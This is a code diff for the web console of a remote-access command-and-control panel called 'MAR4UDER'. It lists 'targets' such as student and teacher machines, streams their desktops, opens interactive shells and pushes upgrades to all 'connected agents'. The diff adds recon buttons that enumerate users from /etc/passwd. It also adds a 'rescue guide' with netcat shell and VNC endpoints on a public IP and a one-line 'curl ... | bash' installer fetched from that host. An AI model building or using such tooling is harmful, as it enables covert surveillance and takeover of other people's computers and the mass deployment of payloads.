@@ -10,8 +10,9 @@
 
   :root {
     --bg-black: #000000;
-    --bg-panel: rgba(8, 8, 8, 0.9);
-    --bg-term-overlay: rgba(3, 3, 3, 0.82);
+    --bg-panel: rgba(5, 5, 5, 0.45);
+    --bg-panel-border: rgba(255, 0, 51, 0.18);
+    --bg-term-overlay: rgba(0, 0, 0, 0.76);
     --red: #ff0033;
     --red-dark: #88001b;
     --red-dim: rgba(255, 0, 51, 0.15);
@@ -45,21 +46,21 @@
     height: 100vh;
     pointer-events: none;
     z-index: 0;
-    opacity: 0.38;
+    opacity: 0.65;
   }
 
-  /* TOP HUD HEADER */
+  /* TOP HUD HEADER (TRANSLUCENT) */
   #top-hud {
     position: relative;
     z-index: 10;
-    background: rgba(0, 0, 0, 0.92);
+    background: rgba(0, 0, 0, 0.55);
     padding: 6px 16px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    border-bottom: 1px solid rgba(255, 0, 51, 0.2);
+    border-bottom: 1px solid var(--bg-panel-border);
     min-height: 34px;
-    backdrop-filter: blur(6px);
+    backdrop-filter: blur(4px);
   }
 
   .hud-title {
@@ -82,24 +83,24 @@
   .h-val { color: var(--white); font-weight: 700; }
   .h-red { color: var(--red); font-weight: 700; }
 
-  /* BUTTONS WITH SOLID FILL */
+  /* SQUARE SOLID FILL BUTTONS */
   .btn-solid {
-    background: rgba(255, 0, 51, 0.1);
-    border: none;
+    background: rgba(255, 0, 51, 0.12);
+    border: 1px solid rgba(255, 0, 51, 0.3);
     color: var(--white);
     font-family: inherit;
     font-size: 11px;
     font-weight: 700;
-    padding: 5px 12px;
+    padding: 5px 10px;
     cursor: pointer;
-    border-radius: 2px;
-    transition: all 0.12s ease;
+    border-radius: 0px;
+    transition: all 0.1s ease;
     text-transform: uppercase;
   }
   .btn-solid:hover {
     background: var(--red);
     color: #000000;
-    box-shadow: 0 0 8px rgba(255, 0, 51, 0.4);
+    box-shadow: 0 0 8px rgba(255, 0, 51, 0.5);
   }
   .btn-solid:active {
     background: #ffffff;
@@ -108,19 +109,23 @@
   .btn-solid.active-toggle {
     background: var(--red);
     color: #000000;
+    box-shadow: 0 0 8px rgba(255, 0, 51, 0.6);
   }
   .btn-solid.primary-action {
-    background: rgba(255, 0, 51, 0.25);
+    background: rgba(255, 0, 51, 0.22);
     border: 1px solid var(--red);
     color: #ffffff;
-    padding: 6px 14px;
+    padding: 7px 14px;
+    border-radius: 0px;
+    letter-spacing: 0.5px;
   }
   .btn-solid.primary-action:hover {
     background: var(--red);
     color: #000000;
   }
   .btn-solid.danger {
-    background: rgba(136, 0, 27, 0.3);
+    background: rgba(136, 0, 27, 0.35);
+    border-color: var(--red-dark);
     color: var(--red);
   }
   .btn-solid.danger:hover {
@@ -139,31 +144,32 @@
     overflow: hidden;
   }
 
-  /* TOP SECTION: WEBRTC PREVIEW (EXPANDED) + RIGHT CONTROLS & ASCII */
+  /* TOP SECTION: WEBRTC PREVIEW (LEFT) + RIGHT CONTROLS & ASCII */
   #top-preview-box {
-    height: 340px;
+    height: 350px;
     min-height: 180px;
     background: var(--bg-panel);
-    border-radius: 3px;
+    border: 1px solid var(--bg-panel-border);
+    border-radius: 0px;
     padding: 8px 10px;
     display: flex;
     overflow: hidden;
-    backdrop-filter: blur(6px);
+    backdrop-filter: blur(4px);
   }
 
-  /* WEBRTC STREAM CONTAINER (LARGE, 16:9 FIXED ASPECT RATIO) */
+  /* WEBRTC STREAM CONTAINER (16:9 LOCKED ASPECT RATIO) */
   #webrtc-stream-pane {
     width: 620px;
     min-width: 280px;
     height: 100%;
-    background: #000000;
-    border-radius: 3px;
+    background: rgba(0, 0, 0, 0.65);
+    border: 1px solid rgba(255, 0, 51, 0.2);
+    border-radius: 0px;
     display: flex;
     align-items: center;
     justify-content: center;
     position: relative;
     overflow: hidden;
-    box-shadow: 0 0 12px rgba(0, 0, 0, 0.85);
   }
 
   .video-aspect-wrapper {
@@ -192,76 +198,47 @@
     aspect-ratio: 16 / 9;
   }
 
-  /* SEMI-TRANSPARENT TERMINAL OVERLAY DIRECTLY OVER WEBRTC WINDOW */
+  /* MINIMALIST SEMI-TRANSPARENT TERMINAL HUD OVERLAY OVER WEBRTC */
   #stream-terminal-overlay {
     position: absolute;
     inset: 0;
     background: var(--bg-term-overlay);
-    backdrop-filter: blur(8px);
+    backdrop-filter: blur(5px);
     z-index: 25;
     display: none;
     flex-direction: column;
-    border: 1px solid rgba(255, 0, 51, 0.35);
-    border-radius: 3px;
+    padding: 8px 10px;
+    overflow: hidden;
+    border: 1px solid rgba(255, 0, 51, 0.4);
   }
   #stream-terminal-overlay.visible {
     display: flex;
   }
 
-  .overlay-term-topbar {
-    background: rgba(15, 15, 15, 0.95);
-    padding: 6px 10px;
-    border-bottom: 1px solid rgba(255, 0, 51, 0.25);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    font-size: 11px;
-    font-weight: 700;
-  }
-  .ott-title {
-    color: var(--red);
-  }
-  .ott-close {
-    background: transparent;
-    border: 1px solid var(--red-dark);
-    color: var(--red);
-    font-family: inherit;
-    font-size: 10px;
-    font-weight: 700;
-    padding: 1px 6px;
-    cursor: pointer;
-    border-radius: 2px;
-  }
-  .ott-close:hover {
-    background: var(--red);
-    color: #000;
-  }
-
   #pty-screen-overlay {
     flex: 1;
-    padding: 8px 10px;
     overflow-y: auto;
     font-family: inherit;
-    font-size: 11.5px;
-    line-height: 1.4;
-    color: #eaeaea;
+    font-size: 12px;
+    line-height: 1.35;
+    color: #ececec;
     white-space: pre-wrap;
     word-break: break-all;
     outline: none;
   }
 
   .overlay-term-input-strip {
-    background: rgba(10, 10, 10, 0.95);
-    padding: 5px 8px;
+    background: transparent;
+    padding: 4px 0 0 0;
     display: flex;
     align-items: center;
     gap: 6px;
-    border-top: 1px solid rgba(255, 255, 255, 0.08);
+    border-top: 1px dashed rgba(255, 0, 51, 0.3);
   }
   .ott-prompt {
     color: var(--red);
     font-weight: 700;
-    font-size: 11px;
+    font-size: 12px;
     white-space: nowrap;
   }
   .ott-input {
@@ -270,7 +247,7 @@
     border: none;
     color: var(--white);
     font-family: inherit;
-    font-size: 11.5px;
+    font-size: 12px;
     outline: none;
   }
 
@@ -289,7 +266,6 @@
     width: 2px;
     height: 36px;
     background: rgba(255, 0, 51, 0.3);
-    border-radius: 1px;
   }
   .resizer-top-h:hover, .resizer-top-h.dragging {
     background: rgba(255, 0, 51, 0.15);
@@ -313,7 +289,6 @@
     width: 60px;
     height: 2px;
     background: rgba(255, 0, 51, 0.3);
-    border-radius: 1px;
   }
   .resizer-v:hover, .resizer-v.dragging {
     background: rgba(255, 0, 51, 0.15);
@@ -323,18 +298,19 @@
     box-shadow: 0 0 8px var(--red);
   }
 
-  /* RIGHT OF WEBRTC: ASCII BANNER, TARGET INFO, ACTIONS */
+  /* RIGHT OF WEBRTC: ASCII BANNER, TARGET INFO, CLI ACTION SUITE */
   #banner-controls-pane {
     flex: 1;
     min-width: 280px;
     display: flex;
     flex-direction: column;
-    justify-content: space-between;
-    overflow: hidden;
-    padding-left: 6px;
+    justify-content: flex-start;
+    overflow-y: auto;
+    padding: 2px 8px;
+    gap: 6px;
   }
 
-  /* CLEAN, CRISP ASCII ART BANNER */
+  /* ASCII ART BANNER AT TOP */
   #ascii-banner-art {
     color: var(--red);
     font-family: var(--font-bash);
@@ -346,18 +322,17 @@
     text-shadow: 0 0 8px rgba(255, 0, 51, 0.45);
   }
 
-  /* TARGET INFO UNDER ASCII BANNER */
+  /* TARGET INFO STRIP DIRECTLY UNDER MAR4UDER BANNER */
   .target-info-strip {
     display: flex;
     flex-direction: column;
-    gap: 3px;
-    border-top: 1px solid rgba(255, 255, 255, 0.06);
-    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-    padding: 6px 0;
+    gap: 2px;
+    padding: 4px 0 6px 0;
+    border-bottom: 1px solid rgba(255, 0, 51, 0.2);
   }
   .ti-name {
     color: var(--white);
-    font-size: 13px;
+    font-size: 12px;
     font-weight: 700;
   }
   .ti-name span {
@@ -367,31 +342,37 @@
     color: var(--gray);
     font-size: 11px;
     display: flex;
-    gap: 14px;
+    flex-wrap: wrap;
+    gap: 10px;
   }
 
-  /* PRIMARY & SECONDARY ACTIONS */
-  .actions-master-group {
+  /* CLI MASTER SUITE GROUPS */
+  .cli-suite {
     display: flex;
     flex-direction: column;
-    gap: 8px;
-  }
-  .primary-action-row {
-    display: flex;
-    gap: 8px;
-  }
-  .secondary-action-row {
-    display: flex;
     gap: 6px;
+  }
+  .cli-group-label {
+    color: var(--red-dark);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.8px;
+    margin-top: 2px;
+    text-transform: uppercase;
+  }
+  .btn-row-flex {
+    display: flex;
     flex-wrap: wrap;
+    gap: 4px;
   }
 
-  /* BOTTOM SERVERS LIST TABLE */
+  /* BOTTOM SERVERS LIST TABLE (TRANSLUCENT) */
   #servers-table-pane {
     flex: 1;
     min-height: 120px;
     background: var(--bg-panel);
-    border-radius: 3px;
+    border: 1px solid var(--bg-panel-border);
+    border-radius: 0px;
     display: flex;
     flex-direction: column;
     overflow: hidden;
@@ -399,10 +380,10 @@
   }
 
   .table-title-bar {
-    padding: 8px 14px;
+    padding: 6px 12px;
     color: var(--red);
     font-weight: 700;
-    font-size: 12px;
+    font-size: 11px;
     letter-spacing: 1px;
     display: flex;
     justify-content: space-between;
@@ -415,7 +396,7 @@
     color: var(--red);
     font-weight: 700;
     font-size: 11px;
-    padding: 6px 14px;
+    padding: 5px 12px;
     border-bottom: 1px solid rgba(255, 255, 255, 0.08);
   }
 
@@ -431,16 +412,17 @@
   .server-row {
     display: grid;
     grid-template-columns: 55px 180px 160px 120px 140px 90px 1fr;
-    padding: 6px 10px;
-    border-radius: 2px;
+    padding: 5px 8px;
+    border-radius: 0px;
     cursor: pointer;
     color: #b0b0b0;
     font-size: 12px;
     align-items: center;
+    background: rgba(0, 0, 0, 0.2);
     transition: all 0.08s ease;
   }
   .server-row:hover {
-    background: rgba(255, 0, 51, 0.15);
+    background: rgba(255, 0, 51, 0.18);
     color: var(--white);
   }
   .server-row.selected {
@@ -485,15 +467,11 @@
         <div id="stream-placeholder" style="color: var(--gray-dim); font-size: 12px; text-align: center;">[!] Select a node from the list to start WebRTC stream</div>
       </div>
 
-      <!-- SEMI-TRANSPARENT TERMINAL OVERLAY DIRECTLY OVER WEBRTC STREAM -->
+      <!-- MINIMALIST HUD TERMINAL OVERLAY OVER WEBRTC STREAM -->
       <div id="stream-terminal-overlay">
-        <div class="overlay-term-topbar">
-          <div class="ott-title" id="overlay-term-title">INTERACTIVE PTY // HUD OVERLAY</div>
-          <button class="ott-close" onclick="toggleTerminalOverlay()">[X] CLOSE (ESC)</button>
-        </div>
-        <div id="pty-screen-overlay" tabindex="0">[*] Interactive terminal session attached.</div>
+        <div id="pty-screen-overlay" tabindex="0">[*] Interactive terminal session attached. Press ESC to hide.</div>
         <div class="overlay-term-input-strip">
-          <div class="ott-prompt" id="overlay-prompt-tag">m4r></div>
+          <div class="ott-prompt" id="overlay-prompt-tag">teacher@mos-81141a ~ $</div>
           <input type="text" class="ott-input" id="overlay-term-input" placeholder="Type shell command..." onkeydown="handleOverlayTermKey(event)">
         </div>
       </div>
@@ -502,10 +480,10 @@
     <!-- HORIZONTAL RESIZER BETWEEN WEBRTC PREVIEW AND CONTROLS -->
     <div class="resizer-top-h" id="resizer-top-h"></div>
 
-    <!-- RIGHT: ASCII BANNER, TARGET INFO, AND ACTION BUTTONS -->
+    <!-- RIGHT: ASCII BANNER, TARGET INFO, AND CLI ACTION SUITE -->
     <div id="banner-controls-pane">
       
-      <!-- 1. CLEAN & SHARP ASCII ART BANNER -->
+      <!-- 1. CLEAN & SHARP ASCII ART BANNER (TOP) -->
       <pre id="ascii-banner-art">
  __  __   _   ___ _ _  _   _ ___  ___ ___ 
 |  \/  | /_\ | _ \ | || | | |   \| __| _ \
@@ -513,24 +491,46 @@
 |_|  |_/_/ \_\_|_\|_|  \___/|___/|___|_|_\
       </pre>
 
-      <!-- 2. TARGET INFO (PLACED UNDER ASCII BANNER) -->
+      <!-- 2. TARGET INFO (DIRECTLY UNDER MAR4UDER BANNER) -->
       <div class="target-info-strip">
         <div class="ti-name" id="selected-title">TARGET: <span>[NO NODE SELECTED]</span></div>
         <div class="ti-specs" id="selected-specs">IP: 0.0.0.0 | User: - | Ping: 0ms | OS: -</div>
       </div>
 
-      <!-- 3. PRIMARY & SECONDARY ACTION BUTTONS -->
-      <div class="actions-master-group">
-        <div class="primary-action-row">
-          <button class="btn-solid primary-action" onclick="toggleFullscreenStream()">[ ПОЛНОЭКРАННЫЙ РЕЖИМ ]</button>
+      <!-- 3. CLI MASTER CONTROLS & ACTIONS SUITE -->
+      <div class="cli-suite">
+        <!-- PRIMARY SQUARE BUTTONS -->
+        <div class="btn-row-flex">
+          <button class="btn-solid primary-action" onclick="toggleFullscreenStream()">[ ПОЛНОЭКРАННЫЙ ]</button>
           <button class="btn-solid primary-action" id="btn-toggle-term" onclick="toggleTerminalOverlay()">[ ТЕРМИНАЛ ]</button>
         </div>
-        <div class="secondary-action-row">
+
+        <!-- QUICK SHELL EXECUTION (TAB 1) -->
+        <div class="cli-group-label">// SHELL & TELEMETRY</div>
+        <div class="btn-row-flex">
+          <button class="btn-solid" onclick="sendTerminalKey('uname -a\n')">SYSINFO</button>
+          <button class="btn-solid" onclick="sendTerminalKey('ps aux | head -20\n')">PS AUX</button>
+          <button class="btn-solid" onclick="sendTerminalKey('df -h\n')">DF -H</button>
+          <button class="btn-solid" onclick="sendTerminalKey('netstat -tuln 2>/dev/null || ss -tuln\n')">NETSTAT</button>
+          <button class="btn-solid" onclick="sendTerminalKey(`awk -F: '($3 >= 500 || $3 == 0) {print $1}' /etc/passwd\n`)">USERS</button>
+        </div>
+
+        <!-- DESKTOP / VNC CONTROLS (TAB 3) -->
+        <div class="cli-group-label">// DESKTOP STREAM ENGINE</div>
+        <div class="btn-row-flex">
+          <button class="btn-solid" onclick="setEngine('krfb')">KRFB</button>
+          <button class="btn-solid" onclick="setEngine('x11vnc')">X11VNC</button>
+          <button class="btn-solid" onclick="sendTerminalKey('echo \"[+] VNC Preset: Fast 8bpp\";\n')">8-BPP FAST</button>
+          <button class="btn-solid" onclick="sendTerminalKey('echo \"[+] VNC Preset: TrueColor 32bpp\";\n')">32-BPP BEST</button>
+        </div>
+
+        <!-- MAINTENANCE & OPS (TAB 4) -->
+        <div class="cli-group-label">// OPS & RESCUE</div>
+        <div class="btn-row-flex">
           <button class="btn-solid" onclick="pingTarget()">PING</button>
           <button class="btn-solid" onclick="updateTarget()">UPGRADE</button>
-          <button class="btn-solid" onclick="sendTerminalKey('uname -a\n')">SYSINFO</button>
-          <button class="btn-solid" onclick="sendTerminalKey('ps aux | head -15\n')">PS</button>
-          <button class="btn-solid" onclick="sendTerminalKey('df -h\n')">DF</button>
+          <button class="btn-solid" onclick="updateAllNodes()">UPDATE ALL</button>
+          <button class="btn-solid" onclick="showRescueGuide()">RESCUE</button>
           <button class="btn-solid danger" onclick="uninstallTarget()">UNINSTALL</button>
         </div>
       </div>
@@ -568,7 +568,7 @@
   // MOCK SERVERS POOL FALLBACK
   const mockNodes = [
     { id: "mos-ku1eet", hostname: "mos-ku1eet", ip: "192.168.10.14", slot: 1, is_online: true, is_root: false, username: "student", os: "Linux", arch: "x86_64", ping_ms: 12 },
-    { id: "mos-81141a", hostname: "mos-81141a", ip: "10.8.0.52", slot: 2, is_online: true, is_root: true, username: "root", os: "Linux", arch: "x86_64", ping_ms: 24 },
+    { id: "mos-81141a", hostname: "mos-81141a", ip: "10.8.0.52", slot: 2, is_online: true, is_root: true, username: "teacher", os: "Linux", arch: "x86_64", ping_ms: 24 },
     { id: "srv-core-router", hostname: "srv-core-router", ip: "172.16.4.1", slot: 3, is_online: true, is_root: true, username: "root", os: "Linux", arch: "aarch64", ping_ms: 8 },
     { id: "deb-lab-node4", hostname: "deb-lab-node4", ip: "192.168.10.88", slot: 4, is_online: true, is_root: false, username: "operator", os: "Linux", arch: "x86_64", ping_ms: 31 },
     { id: "kali-ext-relay", hostname: "kali-ext-relay", ip: "104.143.206.163", slot: 5, is_online: true, is_root: true, username: "root", os: "Linux", arch: "x86_64", ping_ms: 5 },
@@ -580,7 +580,7 @@
   let termWS = null;
   let isTerminalOpen = false;
 
-  // DARK RED ASCII WAVE CANVAS
+  // DARK RED ASCII WAVE CANVAS WITH ENHANCED CONTRAST
   const canvas = document.getElementById('wave-canvas');
   const ctx = canvas.getContext('2d');
   let cw, ch;
@@ -595,7 +595,7 @@
   let waveStep = 0;
 
   function renderWave() {
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.18)';
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
     ctx.fillRect(0, 0, cw, ch);
     ctx.font = '12px ' + getComputedStyle(document.body).fontFamily;
     
@@ -607,10 +607,10 @@
     for (let r = 0; r < rows; r++) {
       for (let c = 0; c < cols; c++) {
         const val = Math.sin(c * 0.14 + waveStep) + Math.cos(r * 0.16 - waveStep * 0.7);
-        if (val > 0.25) {
+        if (val > 0.15) {
           const charIdx = Math.floor(Math.abs(val) * waveChars.length) % waveChars.length;
-          const alpha = Math.min(0.45, Math.max(0.08, (val / 2.2)));
-          ctx.fillStyle = `rgba(180, 0, 35, ${alpha})`;
+          const alpha = Math.min(0.7, Math.max(0.12, (val / 1.8)));
+          ctx.fillStyle = `rgba(210, 0, 42, ${alpha})`;
           ctx.fillText(waveChars[charIdx], c * stepX, r * stepY);
         }
       }
@@ -748,10 +748,12 @@
     selectedNode = n;
     
     // Update Header
-    document.getElementById('selected-title').innerHTML = `TARGET: <span>[#${n.slot || 1}] ${n.hostname || n.id}</span>`;
+    document.getElementById('selected-title').innerHTML = `<span>[#${n.slot || 1}] ${n.hostname || n.id}</span>`;
     document.getElementById('selected-specs').innerText = `IP: ${n.ip || '0.0.0.0'} | User: ${n.is_root ? 'root' : (n.username || 'user')} | Ping: ${n.ping_ms || 0}ms | OS: ${n.os || 'Linux'}`;
-    document.getElementById('overlay-prompt-tag').innerText = `m4r:${n.hostname || n.id}>`;
-    document.getElementById('overlay-term-title').innerText = `PTY OVERLAY // [${n.hostname || n.id}] (${n.ip})`;
+    
+    const promptUser = n.username || (n.is_root ? 'root' : 'teacher');
+    const promptSign = n.is_root ? '#' : '$';
+    document.getElementById('overlay-prompt-tag').innerText = `${promptUser}@${n.hostname || n.id} ~ ${promptSign}`;
 
     // WebRTC Stream Preview
     const port = n.webrtc_port || (1984 + (n.slot || 1) - 1);
@@ -769,40 +771,47 @@
       termWS = null;
     }
     const out = document.getElementById('pty-screen-overlay');
-    out.innerText = `[*] Connecting interactive PTY to [${nodeId}]...\n`;
+    out.innerText = `[*] Attached PTY session [${nodeId}]. Press ESC to hide.\n`;
 
     const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     termWS = new WebSocket(`${wsProto}//${window.location.host}/ws/terminal?node=${nodeId}`);
 
     termWS.onopen = () => {
-      out.innerText += `[+] PTY session established for [${nodeId}]. Ready.\n`;
+      out.innerText += `[+] Session established. Ready.\n`;
     };
     termWS.onmessage = (e) => {
       out.innerText += e.data;
       out.scrollTop = out.scrollHeight;
     };
     termWS.onclose = () => {
-      out.innerText += `\n[-] PTY session closed.`;
+      out.innerText += `\n[-] Session closed.`;
     };
   }
 
   function sendTerminalKey(k) {
+    if (!isTerminalOpen) {
+      toggleTerminalOverlay(true);
+    }
     if (termWS && termWS.readyState === WebSocket.OPEN) {
       termWS.send(k);
+    } else {
+      const out = document.getElementById('pty-screen-overlay');
+      out.innerText += `\n> ${k}`;
+      out.scrollTop = out.scrollHeight;
     }
   }
 
   function handleOverlayTermKey(e) {
     if (e.key === 'Enter') {
       const input = document.getElementById('overlay-term-input');
-      const val = input.value.trim();
+      const val = input.value;
       input.value = '';
       if (!val) return;
       sendTerminalKey(val + '\n');
     }
   }
 
-  // TERMINAL OVERLAY TOGGLE
+  // MINIMALIST TERMINAL OVERLAY TOGGLE
   function toggleTerminalOverlay(forceState) {
     if (typeof forceState === 'boolean') {
       isTerminalOpen = forceState;
@@ -816,7 +825,7 @@
       btn.classList.add('active-toggle');
       setTimeout(() => {
         document.getElementById('overlay-term-input').focus();
-      }, 50);
+      }, 40);
     } else {
       overlay.classList.remove('visible');
       btn.classList.remove('active-toggle');
@@ -832,16 +841,18 @@
     }
   }
 
+  // ESC KEY TO DISMISS TERMINAL OVERLAY
   window.addEventListener('keydown', (e) => {
     if (e.key === 'Escape' && isTerminalOpen) {
       toggleTerminalOverlay(false);
     }
   });
 
-  // ACTIONS
+  // CLI SUITE ACTIONS
   async function pingTarget() {
     if (!selectedNode) return;
     const out = document.getElementById('pty-screen-overlay');
+    if (!isTerminalOpen) toggleTerminalOverlay(true);
     out.innerText += `\n[*] Pinging [${selectedNode.id}]...\n`;
     const t0 = performance.now();
     try {
@@ -855,12 +866,55 @@
   async function updateTarget() {
     if (!selectedNode) return;
     const out = document.getElementById('pty-screen-overlay');
+    if (!isTerminalOpen) toggleTerminalOverlay(true);
     out.innerText += `\n[*] Upgrading binary on node [${selectedNode.id}]...\n`;
     try {
       const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
       out.innerText += (await res.text()) + '\n';
       out.scrollTop = out.scrollHeight;
     } catch(e) { out.innerText += `[-] Error: ${e.message}\n`; }
+  }
+
+  async function updateAllNodes() {
+    const out = document.getElementById('pty-screen-overlay');
+    if (!isTerminalOpen) toggleTerminalOverlay(true);
+    out.innerText += `\n[*] Triggering mass upgrade on all connected agents...\n`;
+    try {
+      const res = await fetch('/api/v1/nodes/update_all', {method: 'POST'});
+      out.innerText += `[+] Mass update dispatched to all nodes.\n`;
+      out.scrollTop = out.scrollHeight;
+    } catch(e) { out.innerText += `[-] Mass update error: ${e.message}\n`; }
+  }
+
+  async function setEngine(eng) {
+    if (!selectedNode) return;
+    const out = document.getElementById('pty-screen-overlay');
+    if (!isTerminalOpen) toggleTerminalOverlay(true);
+    out.innerText += `\n[*] Switching Desktop Stream Engine to [${eng}] for [${selectedNode.id}]...\n`;
+    try {
+      await fetch(`/api/v1/nodes/${selectedNode.id}/engine`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({engine: eng})
+      });
+      out.innerText += `[+] Engine [${eng}] activated.\n`;
+      out.scrollTop = out.scrollHeight;
+    } catch(e) { out.innerText += `[-] Engine error: ${e.message}\n`; }
+  }
+
+  function showRescueGuide() {
+    const out = document.getElementById('pty-screen-overlay');
+    if (!isTerminalOpen) toggleTerminalOverlay(true);
+    out.innerText += `\n========================================================\n`
+      + `  M4R RESCUE GUIDE // DISASTER RECOVERY & CLI COMMANDS\n`
+      + `========================================================\n`
+      + `  - Direct Netcat Access : nc 104.143.206.163 9000\n`
+      + `  - Direct Node PTY Shell: nc 104.143.206.163 9001 (Slot #1)\n`
+      + `  - Direct VNC Desktop   : 104.143.206.163:5901\n`
+      + `  - Web Upload Endpoint  : http://104.143.206.163:8080/upload\n`
+      + `  - 1-Line Installer     : curl -s http://104.143.206.163:8080/i | bash\n`
+      + `========================================================\n`;
+    out.scrollTop = out.scrollHeight;
   }
 
   async function uninstallTarget() {
